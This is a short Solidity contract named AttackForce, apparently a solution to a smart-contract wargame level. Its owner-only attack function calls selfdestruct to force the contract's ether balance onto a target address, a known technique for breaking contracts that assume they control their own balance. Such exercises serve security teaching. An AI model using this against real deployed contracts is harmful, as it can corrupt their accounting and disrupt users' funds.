// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import {Ownable} from "@openzeppelin/contracts/access/Ownable.sol";

contract AttackForce is Ownable {
    constructor() Ownable(msg.sender) {}

    receive() external payable {}

    function attack(address _target) external payable onlyOwner {
        selfdestruct(payable(_target)); // selfdestruct has been deprecated
    }
}
